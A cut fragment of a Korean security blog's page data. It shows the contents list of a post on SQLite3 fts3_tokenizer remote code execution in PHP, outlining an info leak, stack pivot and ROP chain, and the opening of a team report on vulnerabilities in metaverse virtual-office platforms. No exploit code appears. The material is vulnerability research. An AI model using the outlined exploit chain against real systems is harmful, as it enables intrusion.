12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>참조</h1>\n<hr>\n<p><a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Qian-Exploring-The-New-World-Remote-Exploitation-Of-SQLite-And-Curl-wp.pdf\">us 19 Qian Exploring The New World Remote Exploitation Of SQLite And Curl wp</a></p>\n<p><a href=\"https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf\">us 17 Feng Many Birds One Stone Exploiting A Single SQLite Vulnerability Across Multiple Software</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#php-sandbox\">PHP Sandbox</a></p>\n<ul>\n<li><a href=\"#php-debugging\">PHP Debugging</a></li>\n<li><a href=\"#safe-mode-bypass\">Safe Mode Bypass</a></li>\n<li><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\">PHP SQLite 모듈 (PHP 5.3≥)</a></li>\n<li><a href=\"#fts3_tokenizer-overview\">fts3_tokenizer Overview</a></li>\n<li><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\">SQLite fts3 기능을 활용한 검색 방안</a></li>\n<li><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\">사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\">SQLite fts3 취약점</a></p>\n<ul>\n<li><a href=\"#fts3-module-base-address-leaked\">fts3 module base address leaked</a></li>\n<li><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\">SQLite fts3_tokenizer(), fts3_tokenizer()</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\">fts3 callback을 통한 임의의 코드 실행 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\">xOpen 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\">Exploit 공격 흐름도</a></p>\n</li>\n<li>\n<p><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\">x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</a></p>\n<ul>\n<li><a href=\"#fts3_tokenizer-info-leak\">fts3_tokenizer info leak</a></li>\n<li><a href=\"#fts3-tokenizer-callback\">fts3 tokenizer callback</a></li>\n<li><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\">fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</a></li>\n<li><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\">Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</a></li>\n<li><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\">ROP 기법을 활용하여 RCE 취약점 수행</a></li>\n<li><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\">ROP를 활용해서 시스템 라이브러리 함수 호출 진행</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 20, 2020","title":"SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구","categories":"Web","author":"Zer0Luck","emoji":"🥙"},"fields":{"slug":"/php-sqlite3-1day-rce/"}},"prev":{"id":"8bae5613-f9be-5dec-b3bd-b1a20a7b17af","html":"<h1 id=\"metaversploit\" style=\"position:relative;\"><a href=\"#metaversploit\" aria-label=\"metaversploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MetaVersPloit</h1>\n<h1 id=\"vulnerability-analysis-of-commercial-metaverse-based-virtual-office-platform\" style=\"position:relative;\"><a href=\"#vulnerability-analysis-of-commercial-metaverse-based-virtual-office-platform\" aria-label=\"vulnerability analysis of commercial metaverse based virtual office platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability analysis of commercial metaverse-based virtual office platform</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACg0lEQVQoz2WTS0+TQRiFB+hVkAIVKKVXSoEWCpRepBdaKKWl5Vool6JURDDRoBh3LEwIxgUJGxMTE+IfMLrSuNKExA0b40IT/gd7k8fMV4Kii5M5+b6Z877nzDuiWmOnRutApXP+B/ld/q9S26g1dGMw9nK90UNjcx8GoxdtnZuoZ5iTzS3O7+/zc/EAIQ+KagtCtCGE+WK94DWWS/GmFh8WR5g2S4DO7hFcXXGsjpv09SbZy63ybXOPk8IhQq3vIBKfZ2LyFsnUEulsiUJxm/nFLby+lMLLG09YKT1keu4us4VNZb8UloItZj8DniT5oQxjjlWEtOXuSRCOzBAITxEI5wlHZ4knFxkYyiqIJxcUxBILjIwW8Q1M4HBFcbpjylmzLUyTyYfdlqp06A/mGE0vE0sUGM+UGI7NkZsu4w9OKh1LLh2MpVdIpIqkcyXW1nco3d7B7oogVFYlpmSqWMlwcCiriEgrXt84U7MbpLNrlc6js4qQxFA4j80Sw1w/SnNjFM01l3JxGn0Hoqqdfn8GUaVx0NU7hj+UJzWxquQm7UtxWURalzwUmSGXKLM7eMS+7yurPW9pMWQuJqSjMhUaB8Jt9RLoCWBq9qCv76LZNKiMh4SMQwjTxe230qmL8aL7mNeh7+wFzwjZnqHSuajW2qjW2hVR8eV5gdP9ZV6uZPC2ey4tqP+BSu/EWOcjYMwTby0TbnuAtWkOrc5DfW2QtvopOhvuIc4/PObXu0ecH+/y6s4SphseqjT2K8Ot0v7hSkGdC7VO5ufEXDfPiPENOeNn0k0fEe8PVjg9WufH4RafnpbptfUj1HbUf78arfPKa6q5LGDHWbvNovFMQaThmN/Z2V2zzbbO5QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1-main.png\"\n        title=\"1-main.png\"\n        src=\"/static/cf410f29cff6a4f04c40449382d0b508/37523/1-main.png\"\n        srcset=\"/static/cf410f29cff6a4f04c40449382d0b508/e9ff0/1-main.png 180w,\n/static/cf410f29cff6a4f04c40449382d0b508/f21e7/1-main.png 360w,\n/static/cf410f29cff6a4f04c40449382d0b508/37523/1-main.png 720w,\n/static/cf410f29cff6a4f04c40449382d0b508/302a4/1-main.png 1080w,\n/static/cf410f29cff6a4f04c40449382d0b508/07a9c/1-main.png 1440w,\n/static/cf410f29cff6a4f04c40449382d0b508/29114/1-main.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"author\" style=\"position:relative;\"><a href=\"#author\" aria-label=\"author permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Author</h1>\n<aside>\n💡 Best of the Best 10기 취약점 분석 트랙 MetaVersPloit(이하 MVP) 팀\n</aside>\n<ul>\n<li>김재기 멘토 (주), 정광운 멘토 (부)</li>\n<li>강우원 PL</li>\n<li>김영운 PM, 김두영, 김용식, 안희성, 조준희, 전예찬</li>\n</ul>\n<h1 id=\"goal-\" style=\"position:relative;\"><a href=\"#goal-\" aria-label=\"goal  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Goal 🚀</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACSUlEQVQoz5WTy09TQRTG+8ehG+Mf4MLER3zFuDWaGB/BhWEjcQEs0IWGQBMUFDFiayshukAToTZ9Qm8Ltkh77+19tvcx9/7MHQQSdp7kmzlzJnPmfN+ZScVxjG1ZuI6DaZiYhoHnedi2jeM4GIZBv99HVVV0XZfQNE0iiR/GfN8nsZQQgkwux/LKR96+X2Jx6R3ZfI75xQXyq1+o1WpUq1WKxSKlUolKpSL9BPV6nXK5LP3kcpkwiiL+lGrsbvyiXarSKVVpbRbZ2Siidfb4H0vYppLB21fx93r4PU36QjPw9roMDBPHdTFNU0pgWZZEsk6kSGLJ+UMcVVhXFLZ3WtSUBtutpsRWs8W2oqA0WyhKk0ajwU6riW1bWKYhkyY0YxFBFBNH8XGFrtHH1nUcXUNXVXrdLq7Rw+yrOIaKriUN6dPTbbzwBE0gOuZMKpmzbY276w2mKx3c8GB7oRQzuhozW4gR0QEd8fsDojxO0M7KJFEgCOfLhOM/CL53ZPJUe+ByJpfn4WaB09nPvN5toHRhZDJiLBdzakKQ2QK0dcLMZeLiFOLTRUKvSbBSxjs3iX9rhuGlaYKOTqrhGJz9lub6z2VG1maY6xQotWBkVHBtKubUo5DFAtBeI5y7CZkxorkbBGad4dJX7Au3Gdx7inX1Pp7SOaCcbm9wpZBmtJZB9V1Jb+JNxPkHEU9eCdzkzYqAIPOS8MUd/NW0pCxsG2P2Ofqzx1j5FRlLHerpCP+E1DH2ID7yD8UPh8PjJvzbdWyD3f19+Vv+AvPLIssbn+cGAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"project-intro.png\"\n        title=\"project-intro.png\"\n        src=\"/static/27f12ad7c7b564d61afdd09291b48c1d/37523/project-intro.png\"\n        srcset=\"/static/27f12ad7c7b564d61afdd09291b48c1d/e9ff0/project-intro.png 180w,\n/static/27f12ad7c7b564d61afdd09291b48c1d/f21e7/project-intro.png 360w,\n/static/27f12ad7c7b564d61afdd09291b48c1d/37523/project-intro.png 720w,\n/static/27f12ad7c7b564d61afdd09291b48c1d/302a4/project-intro.png 1080w,\n/static/27f12ad7c7b564d61afdd09291b48c1d/07a9c/project-intro.png 1440w,\n/static/27f12ad7c7b564d61afdd09291b48c1d/c6720/project-intro.png 1922w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>근 미래 메타버스는 현재의 모바일 시장을 넘어서 시공간 제약 없이 사용할 수 있어 기업, 민간, 정부 등 다양한 인프라가 구축되어 인간과 밀접한 관계성이 생성되기 때문에 물리적인 위협이 아닌 보안에 대한 위협이 증가하게 되어 안정성이 떨어질 수 있습니다.</p>\n<p>이번 프로젝트의 목적은 메타버스 플랫폼의 급격한 성장 속에 파고드는 보안 위협을 새싹부터 자르기 위해 메타버스 기반 가상오피스 플랫폼 서비스를 시작하는 스타트 업부터 시작해서 현재 Meta 회사 사명을 바꾼 Facebook의 Horizon 취약점 연구를 진행하였습니다.</p>\n<p>메타버스 가상오피스 플랫폼의 공통적인 기능, 공격 벡터를 산출하고 이를 기반으로 취약점 분석을 진행하여 공통적인 취약점과 다양한 연구를 진행함으로써 인간의 안전을 지키기 위해 수행하였던 메타버스 기반 가상 오피스 플랫폼의 사이버 공격 완화에 기여하고자 합니다.</p>\n<h1 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h1>\n<h2 id=\"what-is-virtual-office\" style=\"position:relative;\"><a href=\"#what-is-virtual-office\" aria-label=\"what is virtual office permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What is Virtual office?</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACtklEQVQoz1WSz2scZRyHh0LxUA8eSlsRL570D+hJems3AYtIDgFzK3jxaA8ekh5SSm4tnoMpS5SqYLYGJEIgCbZQkyZNdrvb3Wx2M7szO5mZd975PZtkQ3TmkRko4uGF9/J+v5/P87wKgJSStbV1emqfJBkyPz/P8vIyw+GQdrtNtVrF8zy63S4rK3/gSAdxFNDf91CbHoctwZHukJGhZFmG67r8vrLMfqfO+T+nzM3NUS6XSdMUXdfpdDqcn/+NbQtWV1exLBOjL6ltauy90Nh90UXtHMHbgfl2tR5R/8vl9daAk+NTzs7OiscLCwv89PMTfnxSprz4mI2NDXzfx/MlXuAQxi5eIPEDjzTNUNIsQ7oOz34JePyty2/ftzEMgzAMmZiY4PLlK1y6eA1FeR9FUbh1s0QUR5imyeLiDzx8+IinlaeYpvX/hKYh0bqSgWYjpUMcJ0xOTnL16jW++OxLxm5M8eGVT7h9+3NOT0+o1WpMT08zOzvLzMwMrVYr14GSpXlCieNauL6N9ASOIxgOjxkfH+fu3W84T4+RgcH9B/colUqFuLxFpVKh0WiwtLRUJC4GQor6xmd7JeB5xWftV43GK43R6ISx8RJj17/iu68PeHBni08/vsOt0k3iOC5ECiFQVRUhHHzPJ2+rZFmKbUk6rQHN1yrtZh+9b5IkCVNTUwW39975iHcvfsAF5VKBIQwjhLARwir45/f86+VtC4Z+4DMwNNR+B8PUC2O5yf12i929Har1LWqNbXarL2kf7BMEPqYuae9J3mw71DYH6H37Pyl55G5d0tiUNPcMbNsu6vSaPgc7MfXnMdU/Q3bWHV6uaww0E2EL9J5dHK1nYlnibeWMOInx3RDHipAiKBgVnESIbYQYhyGDwwCj5zHoScIgIkliojgkTiLCKCjEjkYj/gXJmuUGJES2NQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"project-intro-1.png\"\n        title=\"project-intro-1.png\"\n        src=\"/static/8219b7d6154c41fc05b225c32a36231b/37523/project-intro-1.png\"\n        srcset=\"/static/8219b7d6154c41fc05b225c32a36231b/e9ff0/project-intro-1.png 180w,\n/static/8219b7d6154c41fc05b225c32a36231b/f21e7/project-intro-1.png 360w,\n/static/8219b7d6154c41fc05b225c32a36231b/37523/project-intro-1.png 720w,\n/static/8219b7d6154c41fc05b225c32a36231b/302a4/project-intro-1.png 1080w,\n/static/8219b7d6154c41fc05b225c32a36231b/07a9c/project-intro-1.png 1440w,\n/static/8219b7d6154c41fc05b225c32a36231b/c6720/project-intro-1.png 1922w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><code class=\"language-text\">메타버스</code>라는 키워드는 다양한 분야에서 사용되고 다양한 속성이 부여되어 독특한 특성을 갖게 되어집니다. 다양한 특성중에 크게 5가지 의 특성을 살펴볼 수 있습니다.</p>\n<ul>\n<li>Seamlessness : 메타버스 와 현실간의 연속된 작업 진행</li>\n<li>Presence : 메타버스 속 현실에 가까운 실재감</li>\n<li>Interoperability : 메타버스 와 현실의 실시간 정보 공유를 바탕으로 다양한 경험 획득</li>\n<li>Concurrence : 시공간의 제약 없이 다양한 사람들과 서로 다른경험을 할 수있는 환경</li>\n<li>Economy : 메타버스 속 경제의 흐름</li>\n</ul>\n<p>이러한 특성은 공통으로 현실과 가상세계의 실시간 상호작용으로 볼 수 있겠습니다.</p>\n<p>메타버스속 가상 오피스는 앞선 특성을 포함한 체 가상 오피스만의 기능을 활용하여 또 하나의 가상 세계라고 볼 수 있겠습니다. 현실 세계의 오피스 환경이 메타버스와 실시간으로 상호작용하면서 사용 자간의 다양한 경험을 시공간 제약 없이 어디서든지 연속적으로 접근하며 기업의 경제적 흐름을 더욱더 증진합니다.</p>\n<p>가상 오피스는 회의실, 사무실, 문서 작업, 미팅 등 현실 속 회사 업무의 환경을 그대로 메타버스 로 결합한 형태입니다.</p>\n<h2 id=\"metaverse-virtual-office-platform-service-statistics\" style=\"position:relative;\"><a href=\"#metaverse-virtual-office-platform-service-statistics\" aria-label=\"metaverse virtual office platform service statistics permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MetaVerse Virtual office platform Service statistics</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABo0lEQVQoz61S2Y7aQBD0//8dYARmvYggGbM+8dyeq6JuQ57yEiktjVxqVVfVtKcAgHHosdvtcCxLVFWFuq5xPB5xOp34ez6fcTgcGF+vV+ZQj3j7/R5lWUIIQVIopEuwAf+lcs4oXAQe3Yiv7ytCjOgGjaqqcb//glIaTdNgEQrf9xZ1/YXn84f7l8sFL6HwGBVz19VvCf26YpomdF3PDj5k9MOMbpjYoB9nCGUgtcPj2UFIhdUHNO0PjF2xaIfbveFeJsG+73G73TAMA+Z5RkoRUlssUrPj9BJwb/dhXnjw0/chIqXESVPKmyAJ0bW6rkPbtvDeQ2oDbR1yBuZFIsSEGLfBmBIfITWLEB5nwRziF8YYTkdJrbXsLpXZXHNmsjaOh4dpgXWe+/304uR02OgjGELAOI4sSJhKGwu7boO0P9olJSGjT8JZKE4V3sm3hBlFjJF/Ch3CnFAbKGN5J+NLwLr1nXaBD4Hx9JLwPrDQvKg/T6egpTrn+LrkQEXC4S1OAlIqSCn5aRCf+z4wphljLP9QumHxt8f5L5iKhGhlFOQ3iLhSC69Oc4kAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Project-intro-2.png\"\n        title=\"Project-intro-2.png\"\n        src=\"/static/a6e106673ab4d1db05a73a32238089d3/37523/Project-intro-2.png\"\n        srcset=\"/static/a6e106673ab4d1db05a73a32238089d3/e9ff0/Project-intro-2.png 180w,\n/static/a6e106673ab4d1db05a73a32238089d3/f21e7/Project-intro-2.png 360w,\n/static/a6e106673ab4d1db05a73a32238089d3/37523/Project-intro-2.png 720w,\n/static/a6e106673ab4d1db05a73a32238089d3/302a4/Project-intro-2.png 1080w,\n/static/a6e106673ab4d1db05a73a32238089d3/07a9c/Project-intro-2.png 1440w,\n/static/a6e106673ab4d1db05a73a32238089d3/29114/Project-intro-2.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>메타버스를 기반으로 서비스를 운영 중인 Gather, oVice, Kumospace, Spatial, Horizon 플랫폼의 최근 약 4개월간의 Monthly visits, Monthly unique visitors, visits/unique visitors, visit duration, pages per visit, Bounce rate 데이터를 표로 나열하였습니다.</p>\n<p>해당 데이터를 통해 COVID-19 로 인해 언택트 업무가 증가함에 따라 메타버스 가상 오피스 서비스가 추세적 상승을 하는 것을 확인할 수 있으며 뿐만 아니라 전 세계 적으로 “언택트 업무가 더 효율적이다.” 의견이 많아짐에 따라 가상 오피스에 관심이 커지고 있습니다.</p>\n<h1 id=\"project-approach-methodology\" style=\"position:relative;\"><a href=\"#project-approach-methodology\" aria-label=\"project approach methodology permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Project Approach Methodology</h1>\n<h2 id=\"project-point\" style=\"position:relative;\"><a href=\"#project-point\" aria-label=\"project point permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Project Point</h2>\n<p><img src=\"./%EA%B7%B8%EB%A3%B9_4478.png\" alt=\"그룹 4478.png\"></p>\n<p>우리는 약 4개월의 시간 동안 계층적으로 메타버스 가상오피스 플랫폼 취약점에 대해 연구를 진행했습니다. 메타버스 가상오피스 플랫폼 환경의 취약성을 판단하기 위해 웹 애플리케이션 상에서 서비스 기능과 권한 전반적인 기술 스택을 분석하였습니다. 취약성이 판단된 부분에 대해서 바이너리 애플리케이션 환경에서 해당 기능이 다른 애플리케이션에 대해 교차 검증 및 각 기술 스택에서 발생하는 취약성 및 공통적인 기능 에 대한 취약성 등을 분석하여 계층적으로 깊이 있는 분석을 진행하여 취약점을 발견할 수 있었습니다.</p>\n<h2 id=\"vulnerability-analysis-methodology\" style=\"position:relative;\"><a href=\"#vulnerability-analysis-methodology\" aria-label=\"vulnerability analysis methodology permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 